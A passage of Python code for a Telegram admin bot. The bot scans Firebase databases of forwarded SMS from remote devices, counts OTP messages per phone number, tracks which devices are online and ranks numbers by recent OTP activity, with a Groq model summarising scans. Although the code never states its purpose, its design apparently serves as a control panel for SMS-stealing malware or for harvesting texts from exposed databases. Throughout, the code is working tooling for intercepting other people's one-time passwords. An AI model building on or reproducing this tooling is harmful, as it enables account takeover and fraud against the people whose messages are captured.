            f"It will be probed for recovery automatically.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="👻 Ghost List",    callback_data="ghost_list_0"),
                 InlineKeyboardButton(text="🔙 Admin",         callback_data="back_admin")],
            ]))
    except Exception:
        pass


@router.callback_query(F.data.startswith("admin_unghost_"))
async def cb_admin_unghost(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    nid = int(call.data.split("_")[-1])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Number not found.", show_alert=True)
    with db.cx() as c:
        c.execute("UPDATE numbers SET is_ghost=0, status='Active' WHERE id=?", (nid,))
        c.execute("DELETE FROM ghost_queue WHERE number_id=?", (nid,))
    db.log_action(call.from_user.id, "Admin Restore Active", num["number"])
    await call.answer("✅ Restored to Active.", show_alert=True)
    try:
        await call.message.edit_text(
            f"✅ <b>RESTORED → ACTIVE</b>\n\n"
            f"<code>{_disp(num['number'])}</code> is back in the Active list.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Admin", callback_data="back_admin")],
            ]))
    except Exception:
        pass


@router.callback_query(F.data.startswith("notif_on_"))
async def cb_notif_on(call: CallbackQuery):
    """Enable notifications (watchlist) for this number for this user."""
    nid = int(call.data.split("_")[2])
    uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Number not found.", show_alert=True)
    try:
        with db.cx() as c:
            c.execute("INSERT OR IGNORE INTO watchlist(number,added_by,added_at,note) VALUES(?,?,?,?)",
                      (num["number"], uid, _now_ist().strftime("%d-%m-%Y %H:%M"), "User-subscribed"))
    except Exception as e:
        log.warning("notif_on error: %s", e)
    await call.answer("🔔 Notifications enabled for this number!", show_alert=True)
    # Refresh the detail page
    await cb_numdetail(call)


@router.callback_query(F.data.startswith("notif_off_"))
async def cb_notif_off(call: CallbackQuery):
    """Disable notifications for this number for this user."""
    nid = int(call.data.split("_")[2])
    uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Number not found.", show_alert=True)
    try:
        with db.cx() as c:
            c.execute("DELETE FROM watchlist WHERE number=? AND added_by=?",
                      (num["number"], uid))
    except Exception as e:
        log.warning("notif_off error: %s", e)
    await call.answer("🔕 Notifications disabled for this number.", show_alert=True)
    await cb_numdetail(call)


# ══════════════════════════════════════════════════════════════
# /checkfb COMMAND  — walk all Firebase DBs, show live report
# ══════════════════════════════════════════════════════════════

@router.message(Command("checkfb"))
@router.message(Command("check"))
async def cmd_checkfb(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return await msg.answer("⛔ Admin only.")
    sm = await msg.answer("⏳ <i>Walking all Firebase sources… this may take a moment.</i>")

    srcs = db.cx().execute("SELECT * FROM firebase_sources").fetchall()
    if not srcs:
        return await sm.edit_text("❌ No Firebase sources configured.")

    report_lines = [
        "╔══════════════════════╗\n"
        "  🔍 <b>FIREBASE HEALTH CHECK</b>\n"
        "╚══════════════════════╝\n"
    ]
    total_devices = 0
    total_sms     = 0
    issues        = 0

    async with aiohttp.ClientSession() as sess:
        for src in srcs:
            base    = src["url"].replace(".json","").rstrip("/")
            api_key = src["api_key"]
            label   = src.get("label") or base.split("//")[-1].split(".")[0]
            line    = f"\n🗄 <b>{label}</b>\n"

            # Shallow scan root
            sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            if not isinstance(sh, dict) or not sh:
                line += "  ❌ <i>Unreachable or empty</i>\n"; issues += 1
                report_lines.append(line); continue

            root_keys = list(sh.keys())
            rk        = next((k for k in root_keys if k not in _FB_SYSTEM_KEYS), None)
            line += f"  🔑 Root keys: <code>{', '.join(root_keys[:5])}</code>\n"

            # Check known collection roots
            checked = {}
            for coll in ("user_sms", "sms_forward", "user_data", "messages",
                         "sms", "All_Users", "clients", "registeredDevices"):
                node = await fb_get(sess, f"{base}/{coll}.json?shallow=true", api_key=api_key)
                if isinstance(node, dict) and node:
                    cnt = len(node)
                    checked[coll] = cnt
                    total_devices += cnt if coll in ("user_sms","sms_forward","user_data","messages") else 0
                elif isinstance(node, bool) or node is not None:
                    checked[coll] = "?"

            if checked:
                line += "  📂 Collections:\n"
                for coll, cnt in checked.items():
                    line += f"    • <code>{coll}</code>: <b>{cnt}</b> devices\n"
            else:
                line += "  ⚠️ No known collections found\n"; issues += 1

            # If namespace root found, also check it
            if rk:
                ns_sh = await fb_get(sess, f"{base}/{rk}/.json?shallow=true", api_key=api_key)
                if isinstance(ns_sh, dict) and ns_sh:
                    line += f"  🔰 Namespace <code>{rk}</code> keys: <code>{', '.join(list(ns_sh.keys())[:4])}</code>\n"
                    for nskey in ("All_User","All_Users"):
                        if nskey in ns_sh:
                            ns_deep = await fb_get(sess, f"{base}/{rk}/{nskey}/.json?shallow=true",
                                                    api_key=api_key)
                            if isinstance(ns_deep, dict):
                                for sub, nv in ns_deep.items():
                                    cnt = len(nv) if isinstance(nv, dict) else "?"
                                    line += f"    • <code>{nskey}/{sub}</code>: <b>{cnt}</b>\n"

            report_lines.append(line)

    # DB summary
    n_total  = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    n_active = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    n_ghost  = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE is_ghost=1").fetchone()["c"]
    n_na     = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE carrier IS NULL OR carrier='' OR carrier='N/A'",
    ).fetchone()["c"]
    sms_cnt  = db.cx().execute("SELECT COUNT(*) as c FROM sms_log").fetchone()["c"]

    summary = (
        f"\n📊 <b>LOCAL DB SUMMARY</b>\n"
        f"  📱 Total Numbers: <b>{n_total}</b>  (Active: {n_active} | Ghost: {n_ghost})\n"
        f"  🌐 No-Network (N/A): <b>{n_na}</b>\n"
        f"  💬 SMS Logged: <b>{sms_cnt}</b>\n"
        f"  ⚠️ Issues found: <b>{issues}</b>\n"
    )
    report_lines.append(summary)

    full_text = "".join(report_lines)
    # Telegram message limit
    if len(full_text) > 4000:
        full_text = full_text[:3950] + "\n\n<i>…truncated</i>"
    await sm.edit_text(full_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Re-scan",    callback_data="adm_fb_scan"),
         InlineKeyboardButton(text="🗄 Firebase",   callback_data="adm_firebase")],
    ]))


# ══════════════════════════════════════════════════════════════
# ADMIN FIREBASE SCAN  (adm_fb_scan)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_fb_scan")
async def cb_adm_fb_scan(call: CallbackQuery):
    """Scan all Firebase DBs for issues, incorrect patterns, fix automatically, JSON report."""
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.answer("⏳ Scanning all Firebase databases…")
    sm = await call.message.answer("⏳ <i>Scanning all Firebase sources for issues…</i>")

    srcs    = db.cx().execute("SELECT * FROM firebase_sources").fetchall()
    report  = {"scanned": 0, "issues": [], "fixed": [], "summary": {}}

    async with aiohttp.ClientSession() as sess:
        for src in srcs:
            base    = src["url"].replace(".json","").rstrip("/")
            api_key = src["api_key"]
            label   = src.get("label") or base.split("//")[-1].split(".")[0]
            report["scanned"] += 1

            sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            if not isinstance(sh, dict) or not sh:
                report["issues"].append({"db": label, "issue": "unreachable_or_empty"})
                continue

            rk = next((k for k in sh if k not in _FB_SYSTEM_KEYS), None)

            # Check all numbers from this source for pattern correctness
            src_nums = db.cx().execute(
                "SELECT * FROM numbers WHERE fb_source=?", (src["url"],)).fetchall()

            for n in src_nums:
                dev_id    = n["device_id"]
                sms_path  = n["sms_path"] or ""
                number    = n["number"]

                # Test if the existing sms_path still works
                if sms_path:
                    node = await fb_get(sess, sms_path if sms_path.endswith(".json")
                                         else f"{sms_path}.json", api_key=api_key)
                    if not isinstance(node, dict) or not node:
                        # Path is broken — try to find correct one
                        result = await fetch_sms(number, dev_id, src["url"])
                        if result:
                            new_path = result.get("sms_path", sms_path)
                            if new_path and new_path != sms_path:
                                with db.cx() as c:
                                    c.execute("UPDATE numbers SET sms_path=? WHERE id=?",
                                              (new_path, n["id"]))
                                report["fixed"].append({
                                    "number": number, "old_path": sms_path,
                                    "new_path": new_path})
                        else:
                            report["issues"].append({
                                "db": label, "number": number,
                                "issue": "sms_path_broken_unfixable"})

                # Check carrier — if N/A, try to fetch live
                carrier = n.get("carrier") or ""
                if not carrier or carrier == "N/A":
                    live_carrier = await _fetch_live_network(dev_id, src["url"], api_key)
                    if live_carrier:
                        with db.cx() as c:
                            c.execute("UPDATE numbers SET carrier=? WHERE id=?",
                                      (live_carrier, n["id"]))
                        report["fixed"].append({"number": number,
                                                "fix": "carrier_resolved", "value": live_carrier})

    # Build text report
    report["summary"] = {
        "dbs_scanned": report["scanned"],
        "total_issues": len(report["issues"]),
        "total_fixed": len(report["fixed"]),
    }

    text = (
        f"╔══════════════════════╗\n"
        f"  🔍 <b>FIREBASE SCAN REPORT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🗄 DBs Scanned: <b>{report['summary']['dbs_scanned']}</b>\n"
        f"⚠️ Issues Found: <b>{report['summary']['total_issues']}</b>\n"
        f"✅ Auto-Fixed: <b>{report['summary']['total_fixed']}</b>\n\n"
    )
    if report["issues"]:
        text += "<b>Issues:</b>\n"
        for i in report["issues"][:10]:
            text += f"  • {i.get('number','?')} — {i.get('issue','?')}\n"
        if len(report["issues"]) > 10:
            text += f"  …and {len(report['issues'])-10} more\n"
    if report["fixed"]:
        text += "\n<b>Fixed:</b>\n"
        for f_ in report["fixed"][:10]:
            text += f"  ✅ {f_.get('number','?')} — {f_.get('fix','path updated')}\n"
        if len(report["fixed"]) > 10:
            text += f"  …and {len(report['fixed'])-10} more\n"

    # Offer JSON download as code block
    json_str = json.dumps(report, indent=2, ensure_ascii=False)
    text += f"\n<pre>{json_str[:800]}</pre>"

    await sm.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Re-scan",    callback_data="adm_fb_scan"),
         InlineKeyboardButton(text="🗄 Firebase",   callback_data="adm_firebase")],
    ]))


# ══════════════════════════════════════════════════════════════
# AI DB SCAN  (ai_scan_db_select → ai_scan_db_N)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "ai_scan_db_select")
async def cb_ai_scan_db_select(call: CallbackQuery):
    """Let admin choose which Firebase DB to scan with AI."""
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    srcs = db.cx().execute("SELECT id, url, label FROM firebase_sources").fetchall()
    if not srcs:
        return await call.answer("No Firebase sources configured.", show_alert=True)
    btns = []
    for s in srcs:
        label = s["label"] or s["url"].split("//")[-1].split(".")[0]
        btns.append([InlineKeyboardButton(
            text=f"🗄 {label[:30]}",
            callback_data=f"ai_scan_db_{s['id']}")])
    btns.append([InlineKeyboardButton(text="🔙 AI Center", callback_data="adm_ai_center")])
    await call.message.edit_text(
        "🔍 <b>Select Firebase DB to scan with AI:</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("ai_scan_db_"))
async def cb_ai_scan_db(call: CallbackQuery):
    """AI scan of a specific Firebase DB — counts active/dead/ghost, auto-promotes ghosts."""
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    src_id = int(call.data.split("_")[3])
    src    = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (src_id,)).fetchone()
    if not src: return await call.answer("DB not found.", show_alert=True)
    await call.answer("🤖 AI scanning… please wait.")
    sm     = await call.message.answer("⏳ <i>AI is scanning the database…</i>")

    base    = src["url"].replace(".json","").rstrip("/")
    api_key = src["api_key"] or _get_fb_apikey(src["url"])
    label   = src["label"] or base.split("//")[-1].split(".")[0]

    groq_key   = _get_groq_key()
    model_name = _get_groq_model()

    # Get devices from this source
    db_nums = db.cx().execute(
        "SELECT * FROM numbers WHERE fb_source=?", (src["url"],)).fetchall()

    active_count = 0; dead_count = 0; ghost_count = 0
    promoted     = []
    scanned      = []

    SMS_RECENT_HOURS = 48.0   # SMS within 48h counts as recent activity

    async with aiohttp.ClientSession() as sess:
        for n in db_nums[:50]:  # Cap at 50 for speed
            dev_id   = n["device_id"]
            is_ghost = bool(n["is_ghost"])

            # ── Step 1: check device status node (strict — must have explicit online
            #            signal OR fresh timestamp, NOT just "node exists") ──────────
            info = None
            for info_path in [
                f"{base}/user_data/{dev_id}",
                f"{base}/{dev_id}",
            ]:
                try:
                    info = await asyncio.wait_for(
                        fb_get(sess, f"{info_path}.json", api_key=api_key), timeout=3.0)
                    if isinstance(info, dict) and info: break
                except asyncio.TimeoutError:
                    pass

            if not isinstance(info, dict): info = {}

            # Use strict check — node existence alone ≠ online
            online = _is_strictly_alive(info, max_hours=24.0)

            # ── Step 2: check SMS path for RECENT activity (not just any data) ──
            recent_sms = False
            if n["sms_path"]:
                try:
                    sms_node = await asyncio.wait_for(
                        fb_get(sess, f"{n['sms_path']}.json", api_key=api_key), timeout=3.0)
                    if isinstance(sms_node, dict) and sms_node:
                        latest_ts = _latest_sms_ts(sms_node)
                        if latest_ts:
                            age_h = (datetime.now().timestamp() - latest_ts) / 3600
                            recent_sms = age_h <= SMS_RECENT_HOURS
                        # If no timestamp found in SMS entries, don't count as active
                except asyncio.TimeoutError:
                    pass

            is_alive = online or recent_sms

            if is_alive:
                if is_ghost:
                    # Ghost but CONFIRMED alive — auto-promote to active
                    with db.cx() as c:
                        c.execute("UPDATE numbers SET is_ghost=0, status='Active' WHERE id=?",
                                  (n["id"],))
                    promoted.append(n["number"])
                active_count += 1
            elif is_ghost:
                ghost_count += 1
            else:
                dead_count += 1

            scanned.append({
                "number": n["number"],
                "device_id": dev_id,
                "online": online,
                "recent_sms": recent_sms,
                "was_ghost": is_ghost,
                "promoted": n["number"] in promoted,
                "verdict": "active" if is_alive else ("ghost" if is_ghost else "dead"),
            })

    # Build AI analysis (summarize with Groq if available)
    ai_analysis = ""
    if groq_key and scanned:
        summary_data = {
            "db": label,
            "active": active_count,
            "dead": dead_count,
            "ghost": ghost_count,
            "promoted_from_ghost": len(promoted),
            "sample_devices": scanned[:5],
        }
        try:
            payload = {
                "model": model_name,
                "messages": [
                    {"role": "system", "content":
                        "You are an SMS relay system analyst. Analyze the scan result and "
                        "provide a 3-line actionable summary. Be concise and direct."},
                    {"role": "user", "content": f"Scan result: {json.dumps(summary_data)}"}
                ],
                "max_tokens": 200, "temperature": 0.3,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                    f"{GROQ_BASE_URL}/chat/completions",
                    headers={"Authorization": f"Bearer {groq_key}",
                             "Content-Type": "application/json"},
                    json=payload, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        rj = await resp.json(content_type=None)
                        ai_analysis = rj.get("choices", [{}])[0].get("message", {}).get("content", "")
        except Exception as e:
            log.warning("AI scan analysis failed: %s", e)

    # JSON report
    json_report = {
        "db": label,
        "scanned_count": len(scanned),
        "active": active_count,
        "dead": dead_count,
        "ghost": ghost_count,
        "auto_promoted_ghost_to_active": promoted,
        "ai_analysis": ai_analysis,
        "devices": scanned,
    }
    json_str = json.dumps(json_report, indent=2, ensure_ascii=False)

    text = (
        f"╔══════════════════════╗\n"
        f"  🤖 <b>AI DB SCAN: {label[:16]}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📱 Scanned: <b>{len(scanned)}</b> devices\n"
        f"🟢 Active:  <b>{active_count}</b>\n"
        f"💀 Dead:    <b>{dead_count}</b>\n"
        f"👻 Ghost:   <b>{ghost_count}</b>\n"
        f"⬆ Auto-promoted ghost→active: <b>{len(promoted)}</b>\n"
    )
    if promoted:
        text += f"\n✅ Promoted:\n" + "".join(f"  • <code>{p}</code>\n" for p in promoted[:10])
    if ai_analysis:
        text += f"\n🤖 <b>AI Analysis:</b>\n<i>{ai_analysis[:400]}</i>\n"
    text += f"\n<pre>{json_str[:600]}</pre>"

    await sm.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Re-scan",         callback_data=f"ai_scan_db_{src_id}"),
         InlineKeyboardButton(text="🤖 AI Center",       callback_data="adm_ai_center")],
        [InlineKeyboardButton(text="👻 Scan Ghosts",     callback_data="ai_scan_ghosts")],
    ]))


# ══════════════════════════════════════════════════════════════
# AI GHOST SCAN  (ai_scan_ghosts)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "ai_scan_ghosts")
async def cb_ai_scan_ghosts(call: CallbackQuery):
    """AI-powered ghost scan: check all ghosts, auto-promote alive ones to active."""
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.answer("👻 Scanning ghosts with AI…")
    sm = await call.message.answer("⏳ <i>AI ghost scan in progress… checking all ghost devices.</i>")

    ghosts = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=1 ORDER BY rowid DESC LIMIT 100"
    ).fetchall()

    if not ghosts:
        return await sm.edit_text(
            "👻 <b>No ghost devices found!</b>\n\n"
            "<i>All devices are properly categorized.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🤖 AI Center", callback_data="adm_ai_center")]]))

    promoted_list  = []
    confirmed_dead = []
    still_ghost    = []
    json_results   = []

    SMS_RECENT_HOURS = 48.0   # SMS within 48h = recently active

    async with aiohttp.ClientSession() as sess:
        for n in ghosts:
            dev_id   = n["device_id"]
            fb_src   = n["fb_source"] or ""
            api_key  = _get_fb_apikey(fb_src)
            base     = fb_src.replace(".json","").rstrip("/")

            alive       = False
            recent_sms  = False
            carrier     = n.get("carrier") or ""

            # ── Step 1: check status node STRICTLY (explicit online OR fresh timestamp)
            for check_path in [
                f"{base}/user_data/{dev_id}",
                f"{base}/{dev_id}",
            ]:
                try:
                    node = await asyncio.wait_for(
                        fb_get(sess, f"{check_path}.json", api_key=api_key), timeout=3.0)
                    if isinstance(node, dict) and node:
                        if not carrier:
                            carrier = _extract_carrier_deep(node) or ""
                        if _is_strictly_alive(node, max_hours=24.0):
                            alive = True; break
                except (asyncio.TimeoutError, Exception):
                    continue

            # ── Step 2: check SMS path for RECENT SMS (timestamp-based)
            if not alive and n["sms_path"]:
                try:
                    sms_node = await asyncio.wait_for(
                        fb_get(sess, f"{n['sms_path']}.json", api_key=api_key), timeout=3.0)
                    if isinstance(sms_node, dict) and sms_node:
                        latest_ts = _latest_sms_ts(sms_node)
                        if latest_ts:
                            age_h = (datetime.now().timestamp() - latest_ts) / 3600
                            if age_h <= SMS_RECENT_HOURS:
                                recent_sms = True
                        # NO timestamp found → old data, don't count
                except (asyncio.TimeoutError, Exception):
                    pass

            is_alive = alive or recent_sms

            # Determine verdict
            verdict = "alive" if is_alive else "dead"
            json_results.append({
                "number": n["number"], "device_id": dev_id,
                "alive": is_alive, "online": alive, "recent_sms": recent_sms,
                "verdict": verdict,
            })

            if is_alive:
                # Auto-promote ONLY confirmed alive → active
                with db.cx() as c:
                    if carrier:
                        c.execute("UPDATE numbers SET is_ghost=0, status='Active', carrier=? WHERE id=?",
                                  (carrier, n["id"]))
                    else:
                        c.execute("UPDATE numbers SET is_ghost=0, status='Active' WHERE id=?",
                                  (n["id"],))
                promoted_list.append(n["number"])
            else:
                confirmed_dead.append(n["number"])

    json_report = {
        "total_ghosts_scanned": len(ghosts),
        "promoted_to_active": promoted_list,
        "confirmed_dead": confirmed_dead,
        "still_ghost": still_ghost,
        "device_results": json_results,
    }
    json_str = json.dumps(json_report, indent=2, ensure_ascii=False)

    text = (
        f"╔══════════════════════╗\n"
        f"  👻 <b>AI GHOST SCAN RESULT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"👻 Ghosts Scanned: <b>{len(ghosts)}</b>\n"
        f"⬆ Promoted → Active: <b>{len(promoted_list)}</b>\n"
        f"💀 Confirmed Dead: <b>{len(confirmed_dead)}</b>\n"
        f"🔘 Still Ghost: <b>{len(still_ghost)}</b>\n"
    )
    if promoted_list:
        text += f"\n✅ <b>Promoted:</b>\n" + "".join(f"  • <code>{p}</code>\n" for p in promoted_list[:15])
    if confirmed_dead:
        text += f"\n💀 <b>Dead ({len(confirmed_dead)}):</b> <i>recommend removal</i>\n"
    text += f"\n<pre>{json_str[:600]}</pre>"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Re-scan Ghosts",  callback_data="ai_scan_ghosts"),
         InlineKeyboardButton(text="🤖 AI Center",       callback_data="adm_ai_center")],
        [InlineKeyboardButton(text="👻 Ghost List",       callback_data="ghost_list_0")],
    ])
    await sm.edit_text(text[:4000], reply_markup=kb)


# ══════════════════════════════════════════════════════════════
# N/A NETWORK FIX  — scan numbers with no carrier, move to admin testing
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "fix_na_network")
async def cb_fix_na_network(call: CallbackQuery):
    """Find all numbers with N/A carrier, try to resolve live, move unresolvable to testing."""
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.answer("🔍 Scanning N/A network numbers…")
    sm = await call.message.answer("⏳ <i>Scanning numbers with no network info…</i>")

    na_nums = db.cx().execute(
        "SELECT * FROM numbers WHERE (carrier IS NULL OR carrier='' OR carrier='N/A') "
        "AND is_ghost=0 AND status='Active' LIMIT 50").fetchall()

    if not na_nums:
        return await sm.edit_text("✅ <b>No N/A network numbers found.</b> All carriers are resolved.")

    resolved  = []
    unresolved = []

    for n in na_nums:
        api_key      = _get_fb_apikey(n["fb_source"])
        live_carrier = await _fetch_live_network(n["device_id"], n["fb_source"] or "", api_key)
        if live_carrier:
            with db.cx() as c:
                c.execute("UPDATE numbers SET carrier=? WHERE id=?", (live_carrier, n["id"]))
            resolved.append((n["number"], live_carrier))
        else:
            # Flag offline_since timestamp (marks it as needing network attention)
            with db.cx() as c:
                c.execute("UPDATE numbers SET offline_since=COALESCE(offline_since,?) WHERE id=?",
                          (int(datetime.now().timestamp()), n["id"]))
            unresolved.append(n["number"])

    text = (
        f"╔══════════════════════╗\n"
        f"  🌐 <b>NETWORK FIX REPORT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🔍 Scanned: <b>{len(na_nums)}</b> N/A numbers\n"
        f"✅ Resolved: <b>{len(resolved)}</b>\n"
        f"⚠️ Still N/A (flagged): <b>{len(unresolved)}</b>\n"
    )
    if resolved:
        text += "\n<b>Resolved:</b>\n"
        for num, carrier in resolved[:10]:
            text += f"  ✅ <code>{num}</code> → {carrier}\n"
    if unresolved:
        text += f"\n<b>Still N/A ({len(unresolved)}):</b>\n"
        for num in unresolved[:10]:
            text += f"  ⚠️ <code>{num}</code>\n"

    await sm.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Re-scan",    callback_data="fix_na_network"),
         InlineKeyboardButton(text="⚙ System",     callback_data="adm_system")],
    ]))


# ══════════════════════════════════════════════════════════════
# STOP / RESUME ALERTS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "stop_alerts")
async def cb_stop_alerts(call: CallbackQuery):
    global _alerts_paused
    await call.answer()                          # must be first — Telegram expires queries in 30 s
    if call.from_user.id not in ADMIN_IDS: return
    _alerts_paused = True
    await call.message.answer(
        "╔══════════════════════╗\n"
        "  🔕 <b>ALERTS PAUSED</b>\n"
        "╚══════════════════════╝\n\n"
        "All automatic push alerts (device online/offline, deep scan) are now <b>silenced</b>.\n\n"
        "Tap below to resume them.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔔 Resume Alerts", callback_data="resume_alerts")],
            [InlineKeyboardButton(text="🔙 Admin",          callback_data="back_admin")],
        ]))


@router.callback_query(F.data == "resume_alerts")
async def cb_resume_alerts(call: CallbackQuery):
    global _alerts_paused
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    _alerts_paused = False
    await call.answer("🔔 Alerts resumed!", show_alert=True)
    await call.message.answer(
        "✅ <b>Alerts resumed.</b> You will receive push notifications again.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔕 Pause Again", callback_data="stop_alerts")],
            [InlineKeyboardButton(text="🔙 Admin",        callback_data="back_admin")],
        ]))


# ══════════════════════════════════════════════════════════════
# OFFLINE / GONE NUMBERS — ADMIN STATS VIEW
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("adm_offline_list"))
async def cb_adm_offline_list(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    page = int(call.data.split("_")[-1]) if call.data != "adm_offline_list" else 0
    PG   = 15

    offline_nums = db.cx().execute(
        "SELECT n.*, COALESCE(n.offline_since, n.last_seen_ts) as gone_ts "
        "FROM numbers n "
        "WHERE (n.status='Inactive' OR n.is_ghost=1) "
        "AND n.number NOT LIKE 'DEV-%' "
        "ORDER BY CASE WHEN gone_ts IS NULL THEN 0 ELSE gone_ts END DESC",
    ).fetchall()

    total   = len(offline_nums)
    pages   = max(1, (total + PG - 1) // PG)
    chunk   = offline_nums[page * PG : (page + 1) * PG]
    now_ts  = datetime.now().timestamp()

    text = (
        f"╔══════════════════════╗\n"
        f"  📴 <b>OFFLINE / GONE NUMBERS</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Total: <b>{total}</b>  |  Page <b>{page+1}/{pages}</b>\n\n"
    )
    if not chunk:
        text += "<i>No offline or ghost numbers found.</i>"
    else:
        for n in chunk:
            gone_ts = n["gone_ts"]
            age_str = "unknown"
            if gone_ts:
                age_s = int(now_ts - gone_ts)
                if age_s < 3600:
                    age_str = f"{age_s//60}m ago"
                elif age_s < 86400:
                    age_str = f"{age_s//3600}h {(age_s%3600)//60}m ago"
                else:
                    age_str = f"{age_s//86400}d ago"
            tag  = "👻" if n["is_ghost"] else "🔴"
            kind = "Ghost" if n["is_ghost"] else "Offline"
            carrier = n.get("carrier") or "N/A"
            text += (f"{tag} <code>{n['number']}</code> [{kind}]\n"
                     f"   📶 {carrier}  ·  🕐 {age_str}\n\n")

    btns = []
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅ Prev", callback_data=f"adm_offline_list_{page-1}"))
    if page < pages - 1:
        nav.append(InlineKeyboardButton(text="➡ Next", callback_data=f"adm_offline_list_{page+1}"))
    if nav: btns.append(nav)
    btns.append([InlineKeyboardButton(text="🔙 Statistics", callback_data="adm_report")])
    await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# AI HOT SUGGEST  — scan active numbers → pending admin approval
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "ai_hot_suggest")
async def cb_ai_hot_suggest(call: CallbackQuery):
    """Scan all active numbers, score them with AI confidence, push to admin for approval."""
    global _pending_ai_hot
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.answer("🔥 Starting AI Hot Suggest scan…")
    sm = await call.message.answer("⏳ <i>AI scanning active numbers for hot activity…</i>")

    cutoff_6h  = (_now_ist() - timedelta(hours=6)).strftime("%d-%m-%Y %H:%M:%S")
    cutoff_24h = int((datetime.now() - timedelta(hours=24)).timestamp())

    active_nums = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=0 AND status='Active' "
        "AND number NOT LIKE 'DEV-%' AND fb_source IS NOT NULL "
        "ORDER BY hot_score DESC, last_sms_ts DESC LIMIT 60"
    ).fetchall()

    if not active_nums:
        return await sm.edit_text(
            "❌ <b>No active numbers found.</b>\n"
            "Sync Firebase first, then run AI Hot Suggest.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔙 AI Center", callback_data="adm_ai_center")]]))

    candidates = []
    async with aiohttp.ClientSession() as sess:
        for n in active_nums:
            num_id  = n["id"]
            # Skip if already pending admin review
            if num_id in _pending_ai_hot:
                continue

            dev_id  = n["device_id"] or ""
            fb_src  = n["fb_source"] or ""
            api_key = _get_fb_apikey(fb_src)
            base    = fb_src.replace(".json", "").rstrip("/")

            # Fetch Firebase device node
            info = {}
            for path in [f"{base}/user_data/{dev_id}", f"{base}/{dev_id}"]:
                try:
                    node = await asyncio.wait_for(
                        fb_get(sess, f"{path}.json", api_key=api_key), timeout=3.0)
                    if isinstance(node, dict) and node:
                        info = node; break
                except (asyncio.TimeoutError, Exception):
                    pass

            online     = _is_strictly_alive(info, max_hours=24.0)
            recent_sms = False
            sms_age_min: float | None = None

            if n["sms_path"]:
                try:
                    sms_node = await asyncio.wait_for(
                        fb_get(sess, f"{n['sms_path']}.json", api_key=api_key), timeout=3.0)
                    if isinstance(sms_node, dict) and sms_node:
                        latest_ts = _latest_sms_ts(sms_node)
                        if latest_ts:
                            age_s = datetime.now().timestamp() - latest_ts
                            sms_age_min = age_s / 60
                            recent_sms  = age_s <= 48 * 3600
                except (asyncio.TimeoutError, Exception):
                    pass

            # OTP count in last 6h from SQLite
            otp_row = db.cx().execute(
                "SELECT COUNT(*) as c FROM sms_log "
                "WHERE number=? AND received_at>? AND otp IS NOT NULL AND sms_category='OTP'",
                (n["number"], cutoff_6h)).fetchone()
            otp_count = otp_row["c"] if otp_row else 0

            confidence, reason = _compute_hot_confidence(
                online, recent_sms, otp_count, sms_age_min, n.get("hot_score") or 0)

            # Only suggest numbers with meaningful evidence
            if confidence < 30:
                continue

            # Must have a real phone number
            num_str = n["number"] or ""
